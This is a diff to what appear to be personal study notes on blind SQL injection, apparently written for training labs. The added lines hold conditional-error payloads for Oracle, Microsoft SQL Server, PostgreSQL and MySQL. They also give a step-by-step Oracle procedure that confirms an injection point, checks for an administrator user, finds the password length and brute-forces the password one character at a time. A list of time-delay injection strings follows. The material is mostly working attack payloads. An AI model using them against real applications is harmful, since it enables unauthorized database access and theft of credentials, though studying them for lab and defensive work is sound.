@@ -179,9 +179,12 @@ c. Out-of-band:
                 -> burp payload(cluster-bomb): ' and (select substring(password,$1$,1) from users where username='administrator' and LENGTH (password)>1) = '$a$'--' 
                 -> 1st type: number from 1 to 20. 2nd type: bruteforcer.
 
-
-
 ***** Blind SQLI with conditional errors *****
+
+        Oracle       :	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
+        Microsoft    :	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+        PostgreSQL   :	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
+        MySQL 	     :  SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
 
 1. Confirm that the parameter is vulnerable
 
@@ -189,3 +192,60 @@ c. Out-of-band:
         ' || (select '' from dual) || '  > 200ok: oracle
 
 2. Confirm that the users table exists in the database
+
+        ' || (select '' from users where rownum=1) || '
+            --> users table exists.
+        
+3. Confirm that administrator user exists in the user database.
+
+        ' || (select '' from users where username='administrator') || ' 
+        
+        ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+                               
+        ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
+                  --> Internal server error -> administrator exists
+        
+        ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='romfvecimowxe') || '
+                  --> 200 ok -> user doesn't exists in database
+
+4. Determine length of password
+
+        ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>20) || '
+              -> 200 ok reponse -> password length less than 20
+              -> INternal server error -> password greater 20
+              -> length = between 200 ok and internal server
+              -> if 19 is error and 20 is 200ok than 20 is ans.
+
+5. Output administrator password
+
+        ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a' || '
+        -> checks if the first letter of password is a
+        -> 200 ok -> a is not first letter
+        -> if error =true
+
+        ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,$1$,1)='$a$' || '
+        -> payload burp: 1) number 2) bruteforcer
+
+        Alternative payload:
+        ' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,1,1)='a')|| ' 
+
+***** Blind SQLI with time delays *****
+
+        Oracle       :  dbms_pipe.receive_message(('a'),10)
+        Microsoft    :  WAITFOR DELAY '0:0:10'
+        PostgreSQL   :  SELECT pg_sleep(10)
+        MySQL 	     :  SELECT sleep(10) 
+
+        ' WAITFOR DELAY '0:0:10'--
+        ';WAITFOR DELAY '0:0:10'-- 
+        ')) or sleep(10)='
+        ;waitfor delay '0:0:10'--
+        );waitfor delay '0:0:10'--
+        ';waitfor delay '0:0:10'--
+        ";waitfor delay '0:0:10'--
+        ');waitfor delay '0:0:10'--
+        ");waitfor delay '0:0:10'--
+        ));waitfor delay '0:0:10'--
+
+***** Blind SQLI with conditional time delays *****
+
